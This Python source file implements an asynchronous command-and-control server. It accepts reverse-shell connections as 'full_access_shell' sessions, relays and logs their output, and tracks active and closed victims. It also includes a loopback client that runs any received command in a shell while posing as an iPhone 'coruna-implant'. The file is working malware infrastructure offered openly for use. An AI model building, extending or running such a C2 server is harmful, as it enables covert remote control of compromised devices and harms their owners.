import asyncio
from datetime import datetime
import os
import platform
import socket
import subprocess
from typing import Callable, Dict, List, Optional

from .session import Session


class C2Server:
    MAX_CLOSED_SESSIONS = 50

    def __init__(self, bind_host: str, port: int):
        self.bind_host = bind_host
        self.port = port
        self.active_sessions: Dict[str, Session] = {}
        self.closed_sessions: Dict[str, Session] = {}
        self.total_sessions_count: int = 0
        self.server: Optional[asyncio.Server] = None
        self._listeners: List[Callable] = []
        self._test_tasks: List[asyncio.Task] = []

    def add_listener(self, callback: Callable):
        """Registers a callback(event_dict) invoked on session events."""
        if callback not in self._listeners:
            self._listeners.append(callback)

    def remove_listener(self, callback: Callable):
        if callback in self._listeners:
            self._listeners.remove(callback)

    async def _emit(self, event_type: str, payload: dict):
        event = {
            "event": event_type,
            "timestamp": datetime.now().strftime("%H:%M:%S.%f")[:-3],
            "iso_time": datetime.now().isoformat(),
            **payload,
        }
        for cb in list(self._listeners):
            try:
                res = cb(event)
                if asyncio.iscoroutine(res):
                    await res
            except Exception:
                pass

    def _configure_socket(self, sock: socket.socket):
        """Configure TCP keepalive and socket flags to prevent premature disconnection."""
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            # TCP Keepalive idle timeout (seconds before sending keepalive probes)
            if hasattr(socket, "TCP_KEEPIDLE"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)
            elif hasattr(socket, "TCP_KEEPALIVE"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, 30)
            # Interval between keepalive probes
            if hasattr(socket, "TCP_KEEPINTVL"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
            # Probe count before closing
            if hasattr(socket, "TCP_KEEPCNT"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
            # Disable Nagle's algorithm for interactive shells
            if hasattr(socket, "TCP_NODELAY"):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except (OSError, AttributeError):
            pass

    async def _on_session_command(self, session: Session, command: str, entry: dict):
        await self._emit(
            "session_command",
            {
                "session_id": session.id,
                "command": command,
                "entry": entry,
                "session": session.to_dict(),
            },
        )

    async def _handle_client_connection(self, reader, writer):
        peername = writer.get_extra_info("peername") or ("unknown", 0)
        sock = writer.get_extra_info("socket")
        if sock:
            self._configure_socket(sock)

        session = Session(
            reader,
            writer,
            peername,
            session_type="full_access_shell",
            on_command_cb=self._on_session_command,
        )
        self.active_sessions[session.id] = session
        self.total_sessions_count += 1
        session.append_transcript(
            "system",
            f"[*] Session {session.id} established from {session.ip_address}:{session.port}\n",
            source="system",
        )
        print(f"[*] New session {session.id} — {session.ip_address}:{session.port}")
        await self._emit("session_connected", {"session": session.to_dict()})

        try:
            while True:
                data = await reader.read(65536)
                if not data:
                    break
                text = data.decode("utf-8", errors="replace")
                entry = session.record_output(text)
                await self._emit(
                    "session_output",
                    {
                        "session_id": session.id,
                        "text": text,
                        "entry": entry,
                        "session": session.to_dict(),
                    },
                )
        except (ConnectionResetError, BrokenPipeError, asyncio.CancelledError):
            pass
        except Exception as e:
            print(f"[-] Error in session {session.id}: {e}")
        finally:
            print(f"[*] Session {session.id} from {session.ip_address} closed.")
            session.status = "terminated"
            session.disconnected_at = datetime.now()
            session.append_transcript(
                "system",
                f"[*] Session {session.id} disconnected at {session.disconnected_at.strftime('%H:%M:%S')}\n",
                source="system",
            )
            # Move session to closed_sessions history
            if session.id in self.active_sessions:
                del self.active_sessions[session.id]
            self.closed_sessions[session.id] = session
            if len(self.closed_sessions) > self.MAX_CLOSED_SESSIONS:
                oldest_key = next(iter(self.closed_sessions))
                del self.closed_sessions[oldest_key]
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            await self._emit("session_closed", {"session": session.to_dict()})

    def get_sessions_summary(self) -> List[dict]:
        """Returns a summary of active sessions for display."""
        return [session.to_dict() for session in self.active_sessions.values()]

    def get_all_sessions_summary(self) -> dict:
        """Returns both active and recently closed sessions."""
        return {
            "active": [s.to_dict() for s in self.active_sessions.values()],
            "closed": [s.to_dict() for s in reversed(list(self.closed_sessions.values()))],
            "total_count": self.total_sessions_count,
        }

    def get_session_by_id(self, session_id: str) -> Optional[Session]:
        """Returns an active Session instance by ID."""
        return self.active_sessions.get(session_id)

    def get_any_session_by_id(self, session_id: str) -> Optional[Session]:
        """Returns an active or closed Session instance by ID."""
        return self.active_sessions.get(session_id) or self.closed_sessions.get(session_id)

    async def disconnect_session(self, session_id: str) -> bool:
        """Forcibly closes an active session."""
        session = self.active_sessions.get(session_id)
        if not session:
            return False
        await session.close()
        return True

    async def spawn_loopback_test_session(self) -> str:
        """Spawns a local loopback reverse shell client connected to this C2 server for UI testing."""
        target_host = "127.0.0.1" if self.bind_host in ("0.0.0.0", "::") else self.bind_host
        reader, writer = await asyncio.open_connection(target_host, self.port)

        async def _loopback_worker():
            try:
                banner = (
                    f"Darwin iPhone14,2 22.6.0 Darwin Kernel Version 22.6.0: RELEASE_ARM64_T8110\n"
                    f"[coruna-implant] Connected via loopback test harness ({platform.node()})\n"
                )
                writer.write(banner.encode("utf-8"))
                await writer.drain()
                cwd = os.getcwd()
                while True:
                    line = await reader.readline()
                    if not line:
                        break
                    cmd = line.decode("utf-8", errors="replace").strip()
                    if not cmd:
                        continue
                    if cmd in ("exit", "quit"):
                        writer.write(b"[coruna-implant] Closing session.\n")
                        await writer.drain()
                        break
                    if cmd.startswith("cd "):
                        new_dir = cmd[3:].strip()
                        target_dir = os.path.abspath(os.path.join(cwd, os.path.expanduser(new_dir)))
                        if os.path.isdir(target_dir):
                            cwd = target_dir
                            writer.write(f"cwd -> {cwd}\n".encode("utf-8"))
                        else:
                            writer.write(f"cd: no such directory: {new_dir}\n".encode("utf-8"))
                        await writer.drain()
                        continue
                    try:
                        proc = await asyncio.create_subprocess_shell(
                            cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            cwd=cwd,
                        )
                        try:
                            out, _ = await asyncio.wait_for(proc.communicate(), timeout=15.0)
                        except asyncio.TimeoutError:
                            proc.kill()
                            out = b"[-] Command timed out after 15s.\n"
                        if not out:
                            out = f"[exit {proc.returncode}]\n".encode("utf-8")
                        writer.write(out)
                        await writer.drain()
                    except Exception as exc:
                        writer.write(f"[-] Execution error: {exc}\n".encode("utf-8"))
                        await writer.drain()
            except Exception:
                pass
            finally:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

        task = asyncio.create_task(_loopback_worker())
        self._test_tasks.append(task)
        await asyncio.sleep(0.08)
        return "spawned"

    async def start(self):
        self.server = await asyncio.start_server(
            self._handle_client_connection, self.bind_host, self.port
        )
        print(f"[*] C2 listening on {self.bind_host}:{self.port}")
        async with self.server:
            await self.server.serve_forever()

    def stop(self):
        for t in self._test_tasks:
            t.cancel()
        if self.server:
            self.server.close()
